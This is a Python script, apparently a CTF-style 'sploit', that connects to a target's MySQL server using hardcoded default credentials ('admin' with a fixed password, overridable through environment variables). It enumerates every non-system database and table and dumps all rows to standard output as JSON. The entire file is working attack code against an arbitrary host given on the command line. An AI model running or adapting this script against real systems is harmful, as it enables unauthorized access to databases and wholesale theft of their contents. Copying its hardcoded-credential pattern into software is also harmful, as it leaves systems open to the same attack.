#!/usr/bin/env python3

import json
import os
import sys
from typing import Any, Dict, Iterable, List

DEFAULT_MYSQL_USER = "admin"
DEFAULT_MYSQL_PASSWORD = "S3cr3tP4ssw0rd"
DEFAULT_MYSQL_PORT = 3306

try:
    import pymysql
    from pymysql.cursors import SSCursor, SSDictCursor
    from pymysql.err import MySQLError, OperationalError
except Exception:
    pymysql = None
    SSCursor = None
    SSDictCursor = None
    MySQLError = Exception
    OperationalError = Exception


SYSTEM_DBS = {
    "information_schema",
    "performance_schema",
    "mysql",
    "sys",
}


def eprint(*args: Any, **kwargs: Any) -> None:
    print(*args, file=sys.stderr, **kwargs)


def connect(db: str, host: str, user: str, password: str, port: int):
    assert pymysql is not None
    return pymysql.connect(
        host=host,
        user=user,
        password=password,
        database=db if db else None,
        port=port,
        connect_timeout=3,
        charset="utf8mb4",
        autocommit=True,
        cursorclass=SSDictCursor if SSDictCursor is not None else None,
    )


def list_databases(conn) -> List[str]:
    dbs: List[str] = []
    try:
        with conn.cursor() as cur:
            cur.execute("SHOW DATABASES")
            rows = cur.fetchall()
            for r in rows:
                name = r[0] if isinstance(r, (tuple, list)) else (r.get("Database") if isinstance(r, dict) else None)
                if not name:
                    continue
                if name in SYSTEM_DBS:
                    continue
                dbs.append(name)
    except Exception as ex:
        eprint(f"[!] Failed to list databases: {ex}")
    return dbs


def list_tables(conn, db: str) -> List[str]:
    tables: List[str] = []
    try:
        with conn.cursor() as cur:
            cur.execute(
                """
                SELECT table_name
                FROM information_schema.tables
                WHERE table_schema=%s AND table_type='BASE TABLE'
                ORDER BY table_name
                """,
                (db,),
            )
            rows = cur.fetchall()
            for r in rows:
                name = r[0] if isinstance(r, (tuple, list)) else (r.get("table_name") if isinstance(r, dict) else None)
                if name:
                    tables.append(name)
    except Exception as ex:
        eprint(f"[!] Failed to list tables for db={db}: {ex}")
    return tables


def stream_table_rows(conn, db: str, table: str, batch: int = 1000) -> Iterable[Dict[str, Any]]:
    """Yield rows as dicts for given db.table using server-side cursor to stream."""
    if pymysql is None:
        return
    try:
        with conn.cursor(SSDictCursor if SSDictCursor is not None else None) as cur:
            identifier = f"`{db}`.`{table}`"
            cur.execute(f"SELECT * FROM {identifier}")
            while True:
                rows = cur.fetchmany(batch)
                if not rows:
                    break
                for row in rows:
                    if isinstance(row, dict):
                        yield row
                    else:
                        desc = [d[0] for d in cur.description] if cur.description else []
                        as_dict = {desc[i]: row[i] for i in range(len(desc))}
                        yield as_dict
    except Exception as ex:
        eprint(f"[!] Failed to read {db}.{table}: {ex}")
        return


def dump_all_mysql(host: str, user: str, password: str, port: int) -> None:
    if pymysql is None:
        eprint("PyMySQL is not installed, please `pip install pymysql` to run this sploit")
        return
    try:
        root_conn = connect("", host, user, password, port)
    except OperationalError as ex:
        eprint(f"[!] Connection error to mysql@{host}:{port}: {ex}")
        return
    except Exception as ex:
        eprint(f"[!] Unexpected error connecting to mysql@{host}:{port}: {ex}")
        return

    try:
        dbs = list_databases(root_conn)
    finally:
        try:
            root_conn.close()
        except Exception:
            pass

    for db in dbs:
        try:
            conn = connect(db, host, user, password, port)
        except Exception as ex:
            eprint(f"[!] Failed connecting to db={db}: {ex}")
            continue

        try:
            tables = list_tables(conn, db)
            for table in tables:
                for row in stream_table_rows(conn, db, table):
                    try:
                        print(
                            json.dumps(
                                {
                                    "db": db,
                                    "table": table,
                                    "row": row,
                                },
                                default=str,
                            ),
                            flush=True,
                        )
                    except Exception as jex:
                        eprint(f"[!] JSON encode error for {db}.{table}: {jex}")
                        continue
        finally:
            try:
                conn.close()
            except Exception:
                pass


def main() -> int:
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target>")
        return 1

    target_host = sys.argv[1]

    mysql_user = os.getenv("MYSQL_USER", DEFAULT_MYSQL_USER)
    mysql_password = os.getenv("MYSQL_PASSWORD", DEFAULT_MYSQL_PASSWORD)
    try:
        mysql_port = int(os.getenv("MYSQL_PORT", str(DEFAULT_MYSQL_PORT)))
    except ValueError:
        mysql_port = DEFAULT_MYSQL_PORT

    dump_all_mysql(target_host, mysql_user, mysql_password, mysql_port)
    return 0


if __name__ == "__main__":
    sys.exit(main())
